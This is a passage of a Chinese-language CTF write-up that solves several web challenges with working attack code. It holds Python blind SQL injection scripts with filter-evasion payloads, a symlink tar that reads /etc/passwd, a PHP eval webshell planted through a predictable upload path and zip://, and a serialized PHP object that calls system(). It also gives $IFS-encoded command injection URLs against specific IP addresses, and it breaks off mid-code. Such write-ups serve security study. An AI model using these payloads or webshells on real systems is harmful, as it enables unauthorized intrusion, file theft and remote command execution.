alt="FmM3bq.png"><br>尝试对其进行注入，发现其明显是存在过滤的，一旦遇到关键字就会返回<code>这么坏？想让我下面给你吃吗？XD</code>的字样<br>如果查询不到的话就会返回<code>想让我下面给你吃？</code><br>fuzz一下大概发现过滤的东西有<code>空格，*，union，单引号</code>等等，所以我们就不可以用内联的注入，这里空格我们可以用<code>%0a</code>去绕过，测试一下<br><a href="https://imgchr.com/i/FmQ9oV" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/30/FmQ9oV.md.png" alt="FmQ9oV.md.png"></a><br>下面就是这次盲注的重点知识利用<code>between and</code><br><img src="https://s1.ax1x.com/2018/11/30/FmQFWF.png" alt="FmQFWF.png"><br>上面两个执行语句就解释了为什么可以这样做，当select的值在between之间就会返回1，而且前面选择出来的词语会按照顺序匹配，第一个匹配正确的话就会匹配第二个<br><img src="https://s1.ax1x.com/2018/11/30/FmQkz4.png" alt="FmQkz4.png"><br>而且还可以固定好最后一位，然后前面一步步去字母给找出<br><img src="https://s1.ax1x.com/2018/11/30/FmQVy9.png" alt="FmQVy9.png"><br>但是把数据库跑出来以后后面继续加上空格还是会显示1，这在写脚本的时候得注意一下，还有几点得注意下，单引号过滤掉可以使用16进制，另外<code>information_schema.tables</code>被过滤可以使用<code>information_schema%0a.tables</code>这样去绕过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># Author:0verWatch</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">burl = <span class="string">'http://101.71.29.5:10008/show.php?id=-1'</span></span><br><span class="line"></span><br><span class="line">flag  = <span class="number">0</span></span><br><span class="line">ans  = <span class="string">''</span></span><br><span class="line">result = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">40</span>):</span><br><span class="line"><span class="keyword">if</span> flag == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">127</span>,<span class="number">32</span>,<span class="number">-1</span>):</span><br><span class="line"><span class="keyword">if</span> j == <span class="number">33</span>:</span><br><span class="line">flag = <span class="number">1</span></span><br><span class="line"><span class="comment">#payload = '%0aor%0a(select%0adatabase()%0abetween%0a0x'+result+hex(j)[2:4]+'%0aand%0a0x7a)' #web</span></span><br><span class="line"><span class="comment">#payload  = '%0aor%0a(select%0a(select%0agroup_concat(table_name)%0afrom%0ainformation_schema%0a.tables%0awhere%0atable_schema%0abetween%0a0x776562%0aand%0a0x776562)%0abetween%0a0x'+result+hex(j)[2:4]+'%0aand%0a0x7a)'  #admin,flaggg,menu</span></span><br><span class="line"><span class="comment">#payload = '%0aor%0a(select%0a(select%0agroup_concat(column_name)%0afrom%0ainformation_schema%0a.columns%0awhere%0atable_name%0abetween%0a0x666c61676767%0aand%0a0x666c61676767)%0abetween%0a0x'+result+hex(j)[2:4]+'%0aand%0a0x7a)'  #id,f1agg</span></span><br><span class="line">payload = <span class="string">'%0aor%0a(select%0a(select%0af1agg%0afrom%0aflaggg)%0abetween%0a0x'</span>+result+hex(j)[<span class="number">2</span>:<span class="number">4</span>]+<span class="string">'%0aand%0a0x7a)'</span></span><br><span class="line">url = burl+ payload</span><br><span class="line">con  = requests.get(url)</span><br><span class="line"><span class="comment">#print(con.text)</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">u"郑州"</span> <span class="keyword">in</span> con.text:</span><br><span class="line">ans = ans + chr(j)</span><br><span class="line">print(result)</span><br><span class="line">result = result + hex(j)[<span class="number">2</span>:<span class="number">4</span>]</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">print(ans)</span><br></pre></td></tr></table></figure><p>愉快地拿到flag<br><a href="https://imgchr.com/i/FmQndx" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/30/FmQndx.md.png" alt="FmQndx.md.png"></a></p><h3 id="interesting-web"><a href="#interesting-web" class="headerlink" title="interesting web"></a>interesting web</h3><p>这个题目上来就发现有注册，登录，找回密码的功能，通常我们需要注册看一下<br>登陆之后发现上传页面，但是根据页面一开始提示说明管理员才可以上传<code>tar</code>包，这里就容易想到软连接，但是首先我们得以<code>admin</code>身份登录，这时候根据http可以发现这应该是<code>flask</code>框架写的web<br><img src="https://s1.ax1x.com/2018/11/30/FmQlWD.png" alt="FmQlWD.png"></p><p>这里有一个点就是<code>flask</code>框架的<code>session</code>可以在浏览器端查看，并且可以读取里面的<code>token</code>值，<br><a href="https://imgchr.com/i/FmQGyd" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/30/FmQGyd.md.png" alt="FmQGyd.md.png"></a><br>这东西可以利用在找回密码的功能上面<br><a href="https://imgchr.com/i/FmQJOA" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/30/FmQJOA.md.png" alt="FmQJOA.md.png"></a><br>这里面的token值我们可以用来直接修改admin的密码，这东西恰好就是修改密码需要的东西<br>然后再以admin身份登录，上一个软连接的tar包，先构造一下tar包<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s /etc/passwd 2222222.jpg</span><br><span class="line">tar cvfp 233.tar 2222222.jpg</span><br></pre></td></tr></table></figure></p><p>上传后tar包解压，然后curl一下该图片地址获取flag<br><a href="https://imgchr.com/i/FmQDSg" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/30/FmQDSg.md.png" alt="FmQDSg.md.png"></a></p><p><code>flag{5be43c58a33a867cb11975587f8edf33}</code></p><h3 id="image-up"><a href="#image-up" class="headerlink" title="image up"></a>image up</h3><p>一上来就是个登录页面其实这个登录页面没有用，你随便输如都可以登录到后台上传页面<br><a href="https://imgchr.com/i/FmQgwq" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/30/FmQgwq.md.png" alt="FmQgwq.md.png"></a><br>可以看到url，可能存在文件包含，尝试一下读取文件，可以读到一下index以及upload页面<br><code>http://101.71.29.5:10007/index.php?page=php://filter/read=convert.base64-encode/resource=index</code><br><code>http://101.71.29.5:10007/index.php?page=php://filter/read=convert.base64-encode/resource=upload</code></p><p> index.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span> php</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'page'</span>])) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!stristr($_GET[<span class="string">'page'</span>], <span class="string">".."</span>)) &#123;</span><br><span class="line">    $page = $_GET[<span class="string">'page'</span>].<span class="string">".php"</span>;</span><br><span class="line">    <span class="keyword">include</span>($page);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    header(<span class="string">"Location: index.php?page=login"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  header(<span class="string">"Location: index.php?page=login"</span>);</span><br><span class="line">这里的代码验证不需要任何检验就可以登录</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?</span> php $error = <span class="string">""</span>;</span><br><span class="line">$exts = <span class="keyword">array</span>(<span class="string">"jpg"</span>, <span class="string">"png"</span>, <span class="string">"gif"</span>, <span class="string">"jpeg"</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($_FILES[<span class="string">"image"</span>])) &#123;</span><br><span class="line">  $temp = explode(<span class="string">"."</span>, $_FILES[<span class="string">"image"</span>][<span class="string">"name"</span>]);</span><br><span class="line">  $extension = end($temp);</span><br><span class="line">  <span class="keyword">if</span> ((@$_upfileS[<span class="string">"image"</span>][<span class="string">"size"</span>] &lt; <span class="number">102400</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (in_array($extension, $exts)) &#123;</span><br><span class="line">      $path = <span class="string">"uploads/"</span>.md5($temp[<span class="number">0</span>].time()).<span class="string">"."</span>.$extension;</span><br><span class="line">      move_uploaded_file($_FILES[<span class="string">"image"</span>][<span class="string">"tmp_name"</span>], $path);</span><br><span class="line">      $error = <span class="string">"????????????!"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      $error = <span class="string">"???????????????"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $error = <span class="string">"??????????????????????????????"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>从文件上传的而这段代码也很容易看，就是文件名加上时间戳然后再MD5拼接成新的文件名，这两个东西我们可以进行预测<br>自己本地新建一个<code>over.php</code><br>里面的内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">phpinfo();</span><br><span class="line">  @<span class="keyword">eval</span>($_POST[<span class="string">'_'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>把该文件压缩，然后改后缀名为.jpg的图片文件，接着就该预测路径名字并使用伪协议<br>这里很坑，有个时区的问题加上<code>8*3600</code><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://101.71.29.5:10007/"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(str)</span>:</span></span><br><span class="line">m = hashlib.md5()</span><br><span class="line">m.update(str)</span><br><span class="line"><span class="keyword">return</span> m.hexdigest()</span><br><span class="line">files = &#123;</span><br><span class="line"><span class="string">"image"</span>:(<span class="string">"over123.jpg"</span>,open(<span class="string">"over.jpg"</span>,<span class="string">"rb"</span>))</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#print open("over.jpg","rb")</span></span><br><span class="line">t = int(time.time()+<span class="number">8</span>*<span class="number">3600</span>)</span><br><span class="line">requests.post(url=url+<span class="string">"upload.php"</span>,files=files)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(t<span class="number">-100</span>,t+<span class="number">150</span>):</span><br><span class="line">path = <span class="string">"uploads/"</span>+md5(<span class="string">"over123"</span>+str(i))+<span class="string">".jpg"</span></span><br><span class="line"><span class="comment">#print 'Waiting'</span></span><br><span class="line">status = requests.get(url=url+path).status_code</span><br><span class="line"><span class="keyword">if</span> status ==<span class="number">200</span>:</span><br><span class="line"><span class="keyword">print</span> path</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure></p><p>爆出路径<br><code>uploads/cf0dd54323ba204f8151905e912964c1.jpg</code><br>最后的关键点是利用伪协议进行命令执行，这里同样的也可以使用phar，关键是把%23改为/就好，注意这里不需要对文件加上相关的后缀<br><code>http://101.71.29.5:10007/index.php?page=zip://./uploads/cf0dd54323ba204f8151905e912964c1.jpg%23over</code><br><a href="https://imgchr.com/i/FmQfYT" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/30/FmQfYT.md.png" alt="FmQfYT.md.png"></a><br>得到flag<br><a href="https://imgchr.com/i/FmQo6J" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/30/FmQo6J.md.png" alt="FmQo6J.md.png"></a><br><code>flag{3809f2ce999b4d99c8051e285505a014}</code></p><h3 id="ezsql"><a href="#ezsql" class="headerlink" title="ezsql"></a>ezsql</h3><p>这一题质量很好哇，考了SQL注入读取文件，反序列化，命令行执行的绕过</p><p>先看看注入点，这里注册进去之后在用户信息里面明显看到id参数，这里就可以测试一下，这里通过这次两个题目的注入，可以学到到先要根据数据库返回的信息来做出自己的判断，比如查到会回显什么，查不到又会回显什么，语法错误又会回显什么等等，根据这个东西去做出判断应该作何注入</p><p>这里还有一个点也是学到的就是怎么测试他是用替换还是删除来过滤黑名单，我们只需要再注册的地方放输入类似<code>select</code>之类的关键字就会在用户页面发现被替换成<code>@</code>。下一个题目也是类似的道理。</p><p>这一个题可以有两种构造布尔盲注的思路一种是利用<code>limit</code>，另一种是用加减号等运算符号，这里同样是很好的学习点</p><p>可以来构造SQL读文件的语句了<br>这里这样构造<code>http://101.71.29.5:10015/user/user.php?id=1-1</code>根据这里的减1还是减0去判断是否存在我们猜测的文件<br>首先得了解一下当数据库里面<code>secure_file_priv</code>的值是空的话，就可以读取任意文件<br><img src="https://s1.ax1x.com/2018/11/30/FmlRud.png" alt="FmlRud.png"><br>开始构造语句<br><code>http://101.71.29.5:10015/user/user.php?id=1-(load_file(&#39;/var/www/html/index.php&#39;) like &#39;&lt;%&#39;)</code><br>但是不能出现引号16进制转一下<br><code>http://101.71.29.5:10015/user/user.php?id=1-(load_file(0x2f7661722f7777772f68746d6c2f696e6465782e706870) like 0x3c25)</code><br>又因为读文件的时候会出现换行等问题而不能全读取因此将loadfile的内容16进制转一下<br><code>http://101.71.29.5:10015/user/user.php?id=1-(hex(load_file(0x2f7661722f7777772f68746d6c2f696e6465782e706870)) like 0x3c25)</code></p><p>模仿着写一个脚本，这里有点不明白的是为什么这里的脚本传进去的字符已经是16进制字符为毛还得hex一次？除了那个<code>%</code>确实需要16进制转一下，但是我试了一下不hex的话不能跑出来，有大佬告诉一下我原因吗23333.<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># Author:0verWatch</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">hex_s = <span class="keyword">lambda</span> s:binascii.hexlify(s)</span><br><span class="line">s = <span class="string">'ABCDEF'</span> + string.digits</span><br><span class="line">filename = <span class="string">'/var/www/html/index.php'</span></span><br><span class="line"><span class="comment">#filename = '/var/www/html/config/waf.php'</span></span><br><span class="line">ans = <span class="string">''</span></span><br><span class="line">url = <span class="string">'http://101.71.29.5:10015/user/user.php?id=2-if(hex(load_file(0x%s)) like 0x%s,1,2)'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">10000</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line">payload = ans + j + <span class="string">'%'</span></span><br><span class="line">_url = url % (hex_s(filename),hex_s(payload))</span><br><span class="line"><span class="comment">#print _url</span></span><br><span class="line">con = requests.get(_url, cookies=&#123;<span class="string">"PHPSESSID"</span>:<span class="string">"vn7dm5pk3dqvicrkg43om69hi0"</span>&#125;)</span><br><span class="line"><span class="keyword">if</span> <span class="string">'2018'</span> <span class="keyword">in</span> con.content:</span><br><span class="line"><span class="keyword">print</span> <span class="string">'...'</span>+payload</span><br><span class="line">ans = ans + j</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure></p><p>然后得到index.php的关键代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'config/sys_config.php'</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'header.php'</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'CONFIG'</span>]))&#123;</span><br><span class="line">    $config = $_COOKIE[<span class="string">'CONFIG'</span>];</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">'config/config.php'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>再去读取config.php里面的内容<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$config = unserialize(base64_decode($config));</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'p'</span>]))&#123;</span><br><span class="line">    $p=$_GET[<span class="string">'p'</span>];</span><br><span class="line">    $config-&gt;$p;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Config</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $config;</span><br><span class="line">    <span class="keyword">private</span> $path;</span><br><span class="line">    <span class="keyword">public</span> $filter;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($config=<span class="string">""</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;config = $config;</span><br><span class="line">        <span class="keyword">echo</span> <span class="number">123</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getConfig</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;config == <span class="string">""</span>)&#123;</span><br><span class="line">            $config = <span class="keyword">isset</span>($_POST[<span class="string">'config'</span>])?$_POST[<span class="string">'config'</span>]:<span class="string">""</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">SetFilter</span><span class="params">($value)</span></span>&#123;</span><br><span class="line"><span class="comment">//        echo $value;</span></span><br><span class="line">$value=waf_exec($value); </span><br><span class="line">        var_dump($value);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;filter)&#123;</span><br><span class="line">            <span class="keyword">foreach</span>(<span class="keyword">$this</span>-&gt;filter <span class="keyword">as</span> $filter)&#123;</span><br><span class="line"></span><br><span class="line">                </span><br><span class="line">                $array = is_array($value)?array_map($filter,$value):call_user_func($filter,$value);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filter = <span class="keyword">array</span>();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span>&#123;</span><br><span class="line">        <span class="comment">//var_dump($key);</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;SetFilter($key);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">""</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>还有一个waf.php,对上面的$value值进行了过滤，这里对命令执行的一些常用语句进行了过滤，所以我们需要进行绕过<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">        $black_str = <span class="string">"/(and|into|or|union|sleep|select|substr|order|left|right|order|by|where|rand|exp|updatexml|insert|update|dorp|delete|[|]|[&amp;])/i"</span>;</span><br><span class="line">        $str = preg_replace($black_str, <span class="string">"@@"</span>,$str);</span><br><span class="line">        <span class="keyword">return</span> addslashes($str);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf_exec</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    $black_str = <span class="string">"/(;|&amp;|&gt;|&#125;|&#123;|%|#|!|\?|@|\+|\/| )/i"</span>;</span><br><span class="line">        $str = preg_replace($black_str, <span class="string">""</span>,$str);</span><br><span class="line">        <span class="keyword">return</span> $str;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>这里的关键是分析<code>config.php</code>里面的代码，一看里面存在<code>unserialize</code>这样的东西，就应该考察的是反序列化，但是这里考的点不是魔法函数，因为构造函数里不存在可以利用的点，但是在<code>SetFilter</code>这个方法里面存在<code>call_user_func</code>这样的回调函数，这个函数第一个参数你想要执行的函数名，第二个参数是要传进去该函数的参数，这里就可以去执行命令<br>先构造类<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$over  = <span class="keyword">new</span> Config();</span><br><span class="line">$over-&gt;filter = <span class="keyword">array</span>(<span class="string">"system"</span>);</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($over));</span><br></pre></td></tr></table></figure></p><p>现在的关键点是对<code>$value</code>赋值，这个东东通过 <code>SetFilter</code>这个方法去传参，往上是通过<code>__get</code>去调用的<br>这个函数的功能是可以调用类里面的私有变量，也可以使用未定义的变量进行赋值，然后config参数是通过<code>cookie</code>传参的，把构造好的序列化放进<code>cookie</code>里面<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CONFIG=Tzo2OiJDb25maWciOjM6e3M6MTQ6IgBDb25maWcAY29uZmlnIjtzOjA6IiI7czoxMjoiAENvbmZpZwBwYXRoIjtOO3M6NjoiZmlsdGVyIjthOjE6e2k6MDtzOjY6InN5c3RlbSI7fX0=</span><br></pre></td></tr></table></figure></p><p>尝试<code>ls</code>命令，出现flag字样的东东，但其实这是个文件夹，可以用ls -l 查看一下<br><a href="https://imgchr.com/i/FmlI4f" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/30/FmlI4f.md.png" alt="FmlI4f.md.png"></a></p><p>但是因为空格被过滤了，用$IFS绕过,同样地/也被过滤了同样需要绕过，这里用<code>expr substr $(pwd) 1 1</code>去绕过<br>注意这里面的空格也得变成<code>$IFS</code>，但是直接变成<code>expr$IFSsubstr$IFS$(pwd)$IFS1$IFS1</code>也不行，因为系统辨别出不出，会出现这样的结果<br><img src="https://s1.ax1x.com/2018/11/30/FmlbvQ.png" alt="FmlbvQ.png"><br>所以得用<code>\</code>分割一下<br><img src="https://s1.ax1x.com/2018/11/30/FmlLuj.png" alt="FmlLuj.png"><br>得到路径下存在flag.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string(54) &quot;ls$IFS.`expr$IFS\substr$IFS$(pwd)$IFS\1$IFS\1`flag2333&quot; flag.php</span><br></pre></td></tr></table></figure></p><p>开始尝试读取文件了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://101.71.29.5:10015/index.php?p=cat$IFS.`expr$IFS\substr$IFS$(pwd)$IFS\1$IFS\1`flag2333`expr$IFS\substr$IFS$(pwd)$IFS\1$IFS\1`flag.php</span><br></pre></td></tr></table></figure></p><p>获得flag<br><a href="https://imgchr.com/i/FmlXbn" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/30/FmlXbn.md.png" alt="FmlXbn.md.png"></a><br><code>flag{d6e29836ea0e962b0b00c3bf9292b5ad}</code></p><h3 id="write-a-shell"><a href="#write-a-shell" class="headerlink" title="write a shell"></a>write a shell</h3><p>这一题也是要测试出来可以用loadfile读文件，先把文件读出来，写了个脚本读文件，读的是<code>user.php</code>的页面源码，前提是得有超过127的用户注册才可以很顺利地读取源码，如果不够可以自己写个脚本跑一下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># Author:0verWatch</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url = <span class="string">"http://101.71.29.5:10011/user/user.php?id=ascii(mid(load_file(0x2f7661722f7777772f68746d6c2f757365722f757365722e706870),&#123;_&#125;,1))"</span></span><br><span class="line">con = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>,<span class="number">100000</span>):</span><br><span class="line">ans=requests.get(url.format(_=str(i)),cookies=&#123;<span class="string">'PHPSESSID'</span>:<span class="string">'bvbjr3qjrktp6qfn393f6itso0'</span>&#125;)</span><br><span class="line">s = re.findall(<span class="string">r"&lt;h1&gt;user_id:(.*?)&lt;/h1&gt;"</span>,ans.content)</span><br><span class="line">con = con+chr(int(s[<span class="number">0</span>]))</span><br><span class="line"><span class="keyword">print</span> con</span><br></pre></td></tr></table></figure></p><p>读出来一部分关键代码是这样子的<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 